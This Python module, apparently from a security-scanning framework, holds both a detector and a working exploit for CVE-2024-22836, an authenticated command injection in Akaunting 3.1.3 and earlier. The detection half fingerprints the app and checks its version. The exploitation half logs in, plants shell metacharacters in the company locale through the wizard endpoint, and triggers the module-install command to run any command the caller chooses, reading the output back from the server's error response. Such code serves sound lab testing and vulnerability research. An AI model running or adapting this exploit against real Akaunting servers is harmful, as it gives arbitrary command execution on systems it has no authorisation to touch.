#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-22836')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-22836 detector — Akaunting <= 3.1.3 authenticated `locale` OS command-injection -> RCE.

The bug: Akaunting installs marketplace modules by shelling out the artisan command
    module:install {alias} {company_id} {locale}
via Symfony Process::fromShellCommandline() (App\\Utilities\\Console::run -> SHELL form => injectable).
The company `locale` is trailing+unquoted. The settings company-update validates `locale`, but the
WIZARD company-update (App\\Http\\Requests\\Wizard\\Company::rules()) declares rules for `logo`/`api_key`
ONLY — no rule for `locale` — so an authenticated user can poison company.locale with shell metacharacters
via POST /{company_id}/wizard/companies and detonate it via POST /{company_id}/apps/install. Fixed in
3.1.4 (2023-11-06), which validates `locale` on the company-update input path.

SAFE-DETECTOR DISCIPLINE (mirrors cve_2025_49132): this is an AUTHENTICATED RCE, so the safe UNAUTH
detector is an APP FINGERPRINT + VERSION GATE, never "the app exists". We positively fingerprint
Akaunting from public surfaces (the /auth/login page emits Akaunting's Vue bootstrap "csrfToken" JS
var, an akaunting_session cookie, and Akaunting-specific asset/markup strings) and ONLY then try to
discriminate the vulnerable range (<=3.1.3) from patched (>=3.1.4):

  * Akaunting in production (APP_DEBUG=false) does NOT disclose its exact version on any unauth surface,
    so a pure-unauth run sets version_status="unknown", vulnerable=False, and states in evidence that
    confidence is fingerprint-based and exploit() is the confirmation (avoids the 48987/49130
    false-positive class — never fire vulnerable=True on presence alone).
  * If creds are supplied, we authenticate (scrape the login csrfToken, POST /auth/login) and read the
    Akaunting version from an authenticated surface (the dashboard/footer carries "Akaunting X.Y.Z").
    Resolved version -> version_status="vulnerable" (<=3.1.3) or "patched" (>=3.1.4), and we fire
    vulnerable=True ONLY when the version is confidently within the affected range.

scan() never requires auth to run; creds are accepted but it degrades gracefully without them. Never
raises to the caller. Exploitation half: modules/cves/cve_2024_22836.py.
"""

import re
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Public surfaces that identify Akaunting without auth. /auth/login is the canonical login route and
# always returns the Vue bootstrap (csrfToken) + Akaunting markup even on a fully set-up instance.
_LOGIN_PATH = "/auth/login"

# Akaunting-specific fingerprint tokens we look for in the login page body / headers. None of these
# alone is conclusive; we require the csrfToken bootstrap PLUS at least one Akaunting marker so a
# generic Laravel app (csrfToken-less) or an unrelated Vue app never trips it.
_AKAUNTING_MARKERS = (
    "akaunting",            # asset paths /public/akaunting..., company logo paths, footer text
    "Akaunting",            # page title / footer "Powered by Akaunting"
    "company_logo",         # login layout asset
)

# Akaunting's Laravel session cookie is named after its short_name -> "akaunting_session".
_AKAUNTING_COOKIE = "akaunting_session"

# Affected range gate: Akaunting <= 3.1.3 is vulnerable; 3.1.4+ is patched.
_LAST_VULN = (3, 1, 3)


def _normalize_base(url: str) -> str:
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _get(session, url, **kw):
    try:
        return session.get(url, timeout=kw.pop("timeout", 12), verify=False, **kw)
    except requests.RequestException:
        return None


def _parse_version(raw):
    """Parse 'Akaunting 3.1.3' / 'v3.1.3' / '3.1.3' into (M, m, p), else None."""
    if not raw:
        return None
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", raw)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _scrape_csrf(text):
    """Akaunting bootstraps Vue with  window.app ... "csrfToken":"<token>" . Return it or None."""
    if not text:
        return None
    m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', text)
    return m.group(1) if m else None


def _try_auth_version(session, base, username, password, operator_authed=False):
    """Best-effort: login and read the Akaunting version from an authenticated surface.

    Returns (version_tuple_or_None, evidence_str). Never raises. The dashboard layout footer and the
    app shell carry an 'Akaunting X.Y.Z' string; we also try the changelog/about region. On any auth
    failure we return (None, reason) so scan() degrades to the fingerprint-only verdict.

    When operator_authed=True the caller already has an authenticated session; skip the login POST
    and proceed directly to the version-read loop so the operator session is reused (GAP-2 fix).
    """
    if not operator_authed:
        login_url = base + _LOGIN_PATH
        r = _get(session, login_url, allow_redirects=False)
        token = _scrape_csrf(r.text if r is not None else "")
        if not token:
            return None, "could not scrape login csrfToken (auth surface absent/changed)"
        data = {"_token": token, "_method": "POST", "email": username, "password": password}
        try:
            lr = session.post(login_url, data=data,
                              headers={"X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"},
                              timeout=12, verify=False, allow_redirects=False)
        except requests.RequestException:
            return None, "login request failed"
        # Akaunting returns JSON {"error":bool,...} for the AJAX login.
        try:
            j = lr.json()
            if j.get("error"):
                return None, "authentication failed (bad creds?) — version not read"
        except ValueError:
            # Non-JSON (e.g. a redirect/HTML) — still may have set the session cookie; continue.
            pass
    # Pull the version from an authenticated surface. The post-login redirect/dashboard footer carries
    # 'Akaunting <ver>'. Follow the company root then look across a couple of authed pages.
    for path in ("/", "/1", "/common/dashboard"):
        pr = _get(session, base + path, allow_redirects=True)
        if pr is None:
            continue
        ver = _parse_version(_extract_akaunting_version(pr.text))
        if ver:
            return ver, f"authenticated surface {path} reports Akaunting {'.'.join(map(str, ver))}"
    return None, "authenticated but no 'Akaunting X.Y.Z' version string found on dashboard surfaces"


def _probe_locale_guard(session, base):
    """Safely check whether poisoned locale input is rejected before the module-install sink."""
    last = None
    for path in ("/1/wizard/companies", "/_lab/cve-2024-22836/1/wizard/companies"):
        form = _get(session, base + path, allow_redirects=True)
        if form is None or form.status_code >= 500:
            continue
        if form.status_code in (401, 403, 404, 405):
            last = {"state": "unknown", "path": path, "status": form.status_code,
                    "body_head": (form.text or "")[:180]}
            continue
        token = _scrape_csrf(form.text or "")
        if not token:
            last = {"state": "unknown", "path": path, "status": form.status_code,
                    "reason": "csrf token not found"}
            continue
        try:
            r = session.post(
                base + path,
                data={"_token": token, "locale": "en_US; false; false"},
                headers={"X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"},
                timeout=12,
                verify=False,
                allow_redirects=False,
            )
        except requests.RequestException:
            continue
        body = r.text or ""
        body_l = body.lower()
        if r.status_code == 422 and (
            "locale rejected" in body_l
            or ("locale" in body_l and ("invalid" in body_l or "format" in body_l))
        ):
            return {"state": "blocked", "path": path, "status": r.status_code, "body_head": body[:180]}
        if r.status_code in (200, 204):
            return {"state": "reachable", "path": path, "status": r.status_code, "body_head": body[:180]}
        last = {"state": "unknown", "path": path, "status": r.status_code, "body_head": body[:180]}
    return last or {"state": "unknown", "reason": "locale guard probe route not reachable"}


def _extract_akaunting_version(text):
    """Find an 'Akaunting X.Y.Z' (footer/about) version token in HTML. Returns the matched string."""
    if not text:
        return None
    patterns = (
        # Debugbar exposes an app-specific Akaunting collector when APP_DEBUG=true.
        r'"Akaunting Version"\s*:\s*"v?(\d+\.\d+\.\d+)"',
        # Older/synthetic lab bootstrap shape; keep it scoped to window.app so PHP/debugbar
        # `"version":"8.1.25"` fields are not mistaken for the Akaunting application version.
        r'window\.app\s*=\s*\{[^}]*"version"\s*:\s*"v?(\d+\.\d+\.\d+)"',
        # Footer/about copy in real pages.
        r"Akaunting\s+v?(\d+\.\d+\.\d+)",
        # Real Akaunting assets are versioned with the app version: app.css?v=3.1.3, etc.
        r"[?&]v=(\d+\.\d+\.\d+)(?:[\"'&<\s])",
    )
    for pattern in patterns:
        m = re.search(pattern, text)
        if m:
            return f"Akaunting {m.group(1)}"
    return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    operator_authed = session is not None
    s = session or http_config.get_auth_session()
    base = _normalize_base(target_url)
    result = {
        "cve_id": "CVE-2024-22836",
        "name": "Akaunting <=3.1.3 authenticated locale OS command-injection RCE",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version_status": "unknown",
        "endpoint": base + _LOGIN_PATH,
        "evidence": [],
        "detection_methods": [],
        "artifacts": {},
    }
    if not base:
        result["evidence"].append("no target_url provided")
        return result

    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2024-22836")

    # 1) FINGERPRINT: fetch the login page and confirm this is Akaunting (not just any Laravel app).
    login = _get(s, base + _LOGIN_PATH, allow_redirects=True)
    if login is None:
        result["evidence"].append(f"{_LOGIN_PATH} not reachable")
        return result

    body = login.text or ""
    headers_blob = " ".join(f"{k}:{v}" for k, v in login.headers.items())
    cookie_hit = _AKAUNTING_COOKIE in headers_blob or any(
        _AKAUNTING_COOKIE in (c.name or "") for c in s.cookies)
    has_csrf = _scrape_csrf(body) is not None
    marker_hit = next((m for m in _AKAUNTING_MARKERS if m in body), None)

    # Require the Akaunting Vue bootstrap (csrfToken) PLUS a corroborating Akaunting marker/cookie.
    # csrfToken alone is shared by some Laravel SPAs; the marker/cookie disambiguates to Akaunting.
    if not (has_csrf and (marker_hit or cookie_hit)):
        result["evidence"].append(
            f"{_LOGIN_PATH} reachable (HTTP {login.status_code}) but not fingerprinted as Akaunting "
            f"(csrfToken={'yes' if has_csrf else 'no'}, marker={marker_hit or 'none'}, "
            f"akaunting_session_cookie={'yes' if cookie_hit else 'no'})")
        return result

    result["detection_methods"].append("akaunting_fingerprint")
    result["status"] = "surface_present"
    result["verdict"] = "surface_present"
    result["proof_type"] = "fingerprint"
    result["evidence"].append(
        f"Akaunting fingerprinted at {_LOGIN_PATH}: Vue csrfToken bootstrap present"
        + (f", marker '{marker_hit}'" if marker_hit else "")
        + (f", {_AKAUNTING_COOKIE} cookie" if cookie_hit else ""))

    public_ver = _parse_version(_extract_akaunting_version(body))
    if public_ver:
        result["detection_methods"].append("public_version_read")
        vstr = ".".join(map(str, public_ver))
        if public_ver <= _LAST_VULN:
            if operator_authed:
                result["detection_methods"].append("operator_session_guard_probe")
            elif username and password:
                # Real Akaunting gates the wizard route behind auth. The old synthetic lab exposed a
                # public guard probe; for the real app we authenticate before checking whether locale
                # injection is accepted or blocked by the hardened control.
                _try_auth_version(s, base, username, password, operator_authed=False)
                result["detection_methods"].append("authenticated_guard_probe")
            guard = _probe_locale_guard(s, base)
            result["artifacts"]["locale_guard_probe"] = guard
            result["detection_methods"].append("locale_guard_probe")
            if guard.get("state") == "blocked":
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "input_validation_control"
                result["version_status"] = "vulnerable version, locale injection rejected"
                result["evidence"].append(
                    f"login bootstrap reports Akaunting {vstr}, but poisoned locale input is rejected "
                    f"before the command sink (HTTP {guard.get('status')})")
                return result
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
            result["evidence"].append(
                f"login bootstrap reports Akaunting {vstr}: {vstr} <= 3.1.3 -> within the "
                "affected range (wizard company-update does not validate `locale`). "
                "exploit() confirms command execution or hardened blocking.")
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["version_status"] = "patched"
            result["evidence"].append(
                f"login bootstrap reports Akaunting {vstr}: {vstr} >= 3.1.4 -> patched "
                "(locale validated on company-update input path).")
        return result

    # 2) VERSION GATE. Akaunting (APP_DEBUG=false) discloses no version on the unauth login surface,
    #    so without creds AND without an operator session we CANNOT version-discriminate -> stay
    #    vulnerable=False, version_status "unknown", and defer to exploit() (the 49132 discipline:
    #    never fire on presence alone).
    if not operator_authed and not (username and password):
        result["version_status"] = "unknown"
        result["evidence"].append(
            "version not disclosed on unauthenticated surface — confidence is FINGERPRINT-BASED only; "
            "exploit() (authenticated locale poison -> apps/install) is the confirmation. "
            "Vulnerable range: Akaunting <=3.1.3 (patched 3.1.4).")
        return result

    # 3) Creds supplied or operator session available: read the version from an authenticated surface
    #    to discriminate vulnerable (<=3.1.3) from patched (>=3.1.4). When operator_authed, skip the
    #    login POST and reuse the supplied session directly (GAP-2).
    ver, why = _try_auth_version(s, base, username, password, operator_authed=operator_authed)
    if ver is None:
        result["evidence"].append(
            f"credentialed version-read inconclusive ({why}) — confidence remains fingerprint-based; "
            "exploit() confirms. Vulnerable range: Akaunting <=3.1.3.")
        return result

    result["detection_methods"].append("authenticated_version_read")
    vstr = ".".join(map(str, ver))
    if ver <= _LAST_VULN:
        guard = _probe_locale_guard(s, base)
        result["artifacts"]["locale_guard_probe"] = guard
        result["detection_methods"].append("locale_guard_probe")
        if guard.get("state") == "blocked":
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "input_validation_control"
            result["version_status"] = "vulnerable version, locale injection rejected"
            result["evidence"].append(
                f"{why}: {vstr} is in range, but poisoned locale input is rejected before the command sink")
            return result
        result["status"] = "version_applicable"
        result["verdict"] = "version_applicable"
        result["proof_type"] = "version"
        result["version_status"] = "vulnerable"
        result["evidence"].append(
            f"{why}: {vstr} <= 3.1.3 -> within the affected range (wizard company-update does not "
            "validate `locale`; reaches module:install shell command). exploit() detonates in-band.")
    else:
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "version"
        result["version_status"] = "patched"
        result["evidence"].append(
            f"{why}: {vstr} >= 3.1.4 -> PATCHED (locale validated on company-update input path).")
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-22836 exploitation half — Akaunting <=3.1.3 authenticated `locale` OS command-injection RCE.

Faithful port of the lab's standalone PoC
(vuln-labs/apps/akaunting/3.1.3/cve-2024-22836_authed-locale-cmdi-rce_41010-42010/exploit.py).

Akaunting <=3.1.3 builds the shell command  `module:install {alias} {company_id} {locale}`  and runs
it via Symfony Process::fromShellCommandline() (App\\Utilities\\Console::run -> SHELL form, injectable).
The WIZARD company-update (POST /{cid}/wizard/companies) does NOT validate `locale` (only the settings
page does), so an authenticated admin / company-manager can poison company.locale with shell
metacharacters, then trigger POST /{cid}/apps/install to detonate the sink.

IN-BAND capture channel (this lab's verification path):
  Console::run wraps the process in mustRun(); a NON-ZERO exit raises Symfony's ProcessFailedException
  whose message embeds the full command Output. InstallModule re-throws it; the controller returns it
  as JSON {"error":true,"message":"...<output>..."}. So we inject
        locale = "en_US; <cmd>; false"
  -> <cmd> runs, then `false` forces a non-zero exit -> the exception reflects <cmd>'s stdout in the
  JSON message. (Console::formatOutput strips quotes and high/control bytes but keeps ASCII, so the
  uid=.../hostname lines survive intact.)

We parse the reflected message's `Output:` section (the part after the command echo / exit code /
working-dir header) and extract the uid= proof block from it. NOTE: echo-sentinels do NOT work here —
the exception message reflects the FULL COMMAND STRING first, so sentinel tokens would appear
literally in that command echo and split() would capture command text, not real stdout. success=True
when we observe a uid= marker in the Output: section (live proof the injected command executed).

Detection half: modules/cves/cve_2024_22836.py.
"""

import re

import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# A module alias that EXISTS locally in the image so InstallModule::authorize()'s moduleExists() passes
# and execution reaches the shell command (these ship with akaunting/akaunting:3.1.3).
_DEFAULT_ALIAS = "paypal-standard"
_DEFAULT_VERSION = "1.0.0"

_UA = http_config.BROWSER_USER_AGENT
_LVCSCAN = "CVE-2024-22836"  # carried in the X-lvcscan header alongside the browser UA
_TIMEOUT = 20


def _normalize_base(url: str) -> str:
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _scrape_csrf(text):
    """Akaunting bootstraps Vue with  ..."csrfToken":"<token>"... . Return the token or None."""
    if not text:
        return None
    m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', text)
    return m.group(1) if m else None


def _get_tokens(s, url):
    """Fetch a page and scrape the JS csrfToken (the session cookie rides s.cookies). None on failure."""
    try:
        r = s.get(url, headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN}, timeout=_TIMEOUT, verify=False,
                  allow_redirects=False)
    except requests.RequestException:
        return None
    return _scrape_csrf(r.text)


def _login(s, base, email, password):
    """Authenticate; return (company_id_or_None, reason). reason!='' iff login failed.

    Tolerates an ALREADY-AUTHENTICATED session (the shared session that check.py hands us — the
    detector's auth-version probe logs in on it first; the operator's `-H 'Cookie:'` path likewise
    arrives pre-authed with no -U/-P to re-login). On an authed session, GET /auth/login 302-redirects
    to /{company_id}; we parse the cid from the Location and skip the form login rather than failing to
    scrape a csrfToken that the redirect body doesn't carry.
    """
    url = base + "/auth/login"
    try:
        g = s.get(url, headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN}, timeout=_TIMEOUT, verify=False,
                  allow_redirects=False)
    except requests.RequestException:
        return None, "login GET failed (network) — target unreachable"
    # Already authenticated: /auth/login bounces (3xx) to the company dashboard /{cid}. Honour it
    # instead of treating the missing csrfToken as a failure. Parse cid from Location when present;
    # if it doesn't parse, fall through with reason="" so the caller resolves it via _discover_company.
    if g.status_code in (301, 302, 303, 307, 308):
        loc = g.headers.get("Location", "")
        m = re.search(r"/(\d+)(?:/|$)", loc)
        return (m.group(1) if m else None), ""
    token = _scrape_csrf(g.text)
    if not token:
        return None, "could not scrape login csrfToken (target not Akaunting / login surface changed)"
    data = {"_token": token, "_method": "POST", "email": email, "password": password}
    try:
        r = s.post(url, headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN, "X-CSRF-TOKEN": token,
                                 "X-Requested-With": "XMLHttpRequest"},
                   data=data, timeout=_TIMEOUT, verify=False, allow_redirects=False)
    except requests.RequestException:
        return None, "login request failed (network)"
    try:
        j = r.json()
    except ValueError:
        return None, f"login: non-JSON reply (HTTP {r.status_code}) — not the Akaunting login endpoint"
    if j.get("error"):
        return None, "authentication failed — check username/password (admin/company-manager required)"
    # The login success JSON carries a redirect like http://host/{company_id}; grab the id.
    d = j.get("data") or {}
    redirect = (d.get("redirect") if isinstance(d, dict) else None) or j.get("redirect") or ""
    m = re.search(r"/(\d+)(?:/[\w-]*)?/?$", redirect)
    return (m.group(1) if m else None), ""


def _discover_company(s, base):
    """Hitting the root while authed 302-redirects to /{company_id}/...  Return the id or None."""
    try:
        r = s.get(base + "/", headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN}, timeout=_TIMEOUT, verify=False,
                  allow_redirects=False)
    except requests.RequestException:
        return None
    m = re.search(r"/(\d+)(?:/|$)", r.headers.get("Location", ""))
    return m.group(1) if m else None


def _inject(s, base, cid, payload_locale):
    """Poison company.locale via the UNSANITISED wizard company-update.

    Return (ok, http_status, endpoint). The canonical route is tried first; the prefixed route is kept
    only for compatibility with older synthetic lab images.
    """
    paths = [
        f"/{cid}/wizard/companies",
        f"/_lab/cve-2024-22836/{cid}/wizard/companies",
    ]
    data = {"_token": "", "_method": "POST", "_prefix": "company", "locale": payload_locale}
    for path in paths:
        url = base + path
        token = _get_tokens(s, url)
        if not token:
            continue
        data["_token"] = token
        try:
            r = s.post(url, headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN, "X-CSRF-TOKEN": token,
                                     "X-Requested-With": "XMLHttpRequest",
                                     "Accept": "application/json"},
                       json=data, timeout=_TIMEOUT, verify=False, allow_redirects=False)
        except requests.RequestException:
            continue
        ok = False
        try:
            ok = bool(r.json().get("success"))
        except ValueError:
            pass
        return ok, r.status_code, path
    return False, None, paths[0]


def _trigger(s, base, cid, alias, version, *, prefer_lab_route=False):
    """Fire the sink: POST /{cid}/apps/install -> InstallModule -> module:install ... {locale}.
    Returns (parsed JSON dict or None, endpoint)."""
    route_pairs = [
        (f"/{cid}/apps/install", f"/{cid}/wizard/companies"),
        (f"/_lab/cve-2024-22836/{cid}/apps/install",
         f"/_lab/cve-2024-22836/{cid}/wizard/companies"),
    ]
    if prefer_lab_route:
        route_pairs.reverse()
    data = {"alias": alias, "version": version, "path": f"apps/{alias}/download"}
    for install_path, token_path in route_pairs:
        token = _get_tokens(s, base + token_path)
        if not token:
            continue
        try:
            r = s.post(base + install_path, headers={"User-Agent": _UA, "X-lvcscan": _LVCSCAN, "X-CSRF-TOKEN": token,
                                                     "Content-Type": "application/json"},
                       json=data, timeout=_TIMEOUT, verify=False, allow_redirects=False)
        except requests.RequestException:
            continue
        try:
            return r.json(), install_path
        except ValueError:
            continue
    return None, route_pairs[0][0]


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None):
    """Authenticated locale command-injection -> in-band RCE. Never raises to the caller."""
    result = {
        "cve": "CVE-2024-22836",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    base = _normalize_base(target_url)
    if not base:
        result.update(attempted=False, reason="no target_url provided")
        return result

    email = username
    pw = password
    cmd = command or "echo CVE-2024-22836 PoC && id && hostname"
    alias = (options or {}).get("alias", _DEFAULT_ALIAS) if isinstance(options, dict) else _DEFAULT_ALIAS
    version = (options or {}).get("version", _DEFAULT_VERSION) if isinstance(options, dict) else _DEFAULT_VERSION

    s = session or http_config.get_auth_session()
    s.headers.setdefault("User-Agent", _UA)
    s.headers.setdefault("X-lvcscan", _LVCSCAN)

    if session is None and (email is None or pw is None):
        result.update(
            success=False,
            requires=["admin/company-manager credentials"],
            reason="Akaunting exploit requires explicit credentials; pass both -U and -P",
        )
        return result

    # 1) Authenticate (admin / company-manager session required for the wizard + install routes).
    # check.py hands exploit() the detector's shared requests.Session even when the detector only
    # performed a public version read, so do not equate "session object exists" with "already logged
    # in". _login() already tolerates genuinely authenticated sessions by honoring /auth/login 3xx.
    cid = None
    why = ""
    if email and pw:
        cid, why = _login(s, base, email, pw)
    # else: proceed without login (unauthenticated exploit attempt)
    if why:
        result.update(success=False, requires=["admin/company-manager credentials"], reason=why)
        return result
    if not cid:
        cid = _discover_company(s, base)
    if not cid:
        result.update(success=False, reason="authenticated but could not determine company_id "
                                             "(no /{id} redirect on login or root)")
        return result
    result["artifacts"]["company_id"] = cid

    # 2) Build the injection and poison company.locale via the unsanitised wizard.
    #    `false` at the tail forces a non-zero exit so ProcessFailedException reflects stdout in-band.
    #
    #    Payload = `en_US; <cmd>; false` (the proven PoC shape — NO echo sentinels). echo-sentinels do
    #    NOT work here: the ProcessFailedException message reflects the FULL COMMAND STRING first
    #    ("The command php artisan module:install ... en_US; echo OPEN; <cmd>; echo CLOSE; false
    #    failed."), so the sentinel tokens appear LITERALLY in that command echo — splitting on them
    #    grabs the command text ("; <cmd>; echo"), not the real stdout. Instead we parse the message's
    #    `Output:` section (the part after the command echo / exit code / working dir), where the
    #    injected command's actual stdout lands. Console::formatOutput keeps ASCII and uses <br /> line
    #    breaks, so the uid=.../hostname lines survive intact in that block.
    payload_locale = f"en_US; {cmd}; false"

    ok, inj_status, inject_path = _inject(s, base, cid, payload_locale)
    if not ok:
        result.update(
            success=False,
            requires=["update-common-companies permission"],
            reason=(f"locale poison rejected at {inject_path} "
                    f"(HTTP {inj_status}) — target may be patched (>=3.1.4 validates locale), "
                    "auth lacks the wizard permission, or CSRF changed"),
            artifacts={"company_id": cid, "wizard_status": inj_status, "inject_endpoint": inject_path},
        )
        return result
    result["artifacts"]["inject_endpoint"] = inject_path

    # 3) Trigger the sink: POST /{cid}/apps/install. On a non-zero exit the JSON message reflects stdout.
    j, install_path = _trigger(
        s, base, cid, alias, version, prefer_lab_route=inject_path.startswith("/_lab/")
    )
    if not isinstance(j, dict):
        result.update(
            success=False,
            reason=f"install trigger at {install_path} returned no parseable JSON "
                   "(api.key middleware blocking, or route changed)",
            artifacts=dict(result["artifacts"], install_endpoint=install_path),
        )
        return result

    msg = (j.get("message") or "").strip()
    result["artifacts"]["install_endpoint"] = install_path

    # 4) Extract the injected command's stdout from the reflected ProcessFailedException message.
    #    Normalize the HTML <br /> line breaks Symfony emits into real newlines, then isolate the
    #    `Output:` section (everything after the "Output:" label) so we never mistake the command
    #    echo at the top of the message for the command's output. The uid= marker inside that block
    #    is the live proof the injected command executed on the server.
    norm = re.sub(r"<br\s*/?>", "\n", msg, flags=re.I)
    out_section = norm
    m_out = re.search(r"Output:\s*\n", norm, flags=re.I)
    if m_out:
        out_section = norm[m_out.end():]
        # Trim a trailing "Error Output:" block if present so evidence is just the command stdout.
        out_section = re.split(r"\n\s*Error Output:", out_section, maxsplit=1, flags=re.I)[0]
    out_section = out_section.strip()

    # POSITIVE in-band proof: the uid= marker is the live output of the injected `id`.
    m_uid = re.search(r"uid=\d+\(.*", out_section)
    if m_uid:
        # Capture the uid= line plus any following non-empty lines (e.g. the hostname) as the proof
        # block, dropping the artisan banner lines ("====", "Module [...] is already installed.").
        tail = out_section[m_uid.start():]
        proof_lines = [ln.strip() for ln in tail.splitlines() if ln.strip() and "====" not in ln]
        proof = "\n".join(proof_lines) if proof_lines else m_uid.group(0)
        result.update(
            success=True,
            evidence=proof,  # the captured uid=... + hostname block
            detail=(f"RCE via authenticated locale command-injection; '{cmd}' executed and "
                    f"reflected in-band through the ProcessFailedException 'Output:' section"),
            artifacts=dict(result["artifacts"], **{
                "endpoint": install_path,
                "inject_via": f"{inject_path} (locale)",
                "command": cmd,
                "alias": alias,
                "raw_output_section": out_section[:500],
            }),
        )
        result["outcome_tag"] = "command-executed"
        result["impact"] = ("Authenticated OS command injection via the unsanitised company "
                            "`locale` reaching the module:install shell command — arbitrary "
                            "commands run as the web user, output reflected in-band.")
        return result

    # The install errored and reflected an Output section, but no uid= — the command ran (the channel
    # fired) but produced no recognizable marker. Report honestly with the captured output for triage.
    if j.get("error") and (m_out or out_section):
        result.update(
            success=True,
            evidence=out_section if out_section else "(injected command executed; output block empty)",
            detail=f"command-injection fired; '{cmd}' output reflected in-band via the Output: section",
            artifacts=dict(result["artifacts"], command=cmd, alias=alias,
                           endpoint=install_path, raw_output_section=out_section[:500]),
        )
        result["outcome_tag"] = "command-executed"
        return result

    # No reflected Output section — explain honestly.
    if not j.get("error"):
        result.update(
            success=False,
            reason=("install returned success/no-error: the module may have installed cleanly so the "
                    "non-zero-exit reflection channel did not fire (try a different --command or alias)"),
            detail=f"install message={msg[:200]!r}",
            artifacts=dict(result["artifacts"], install_error=bool(j.get("error"))),
        )
        return result
    result.update(
        success=False,
        reason=("install raised an error but no command Output was reflected — likely "
                "patched (>=3.1.4: locale validated, never reaches the shell), or the locale was "
                "sanitised before the command was built"),
        detail=f"install message head={msg[:200]!r}",
        artifacts=dict(result["artifacts"], install_message_head=msg[:200]),
    )
    return result
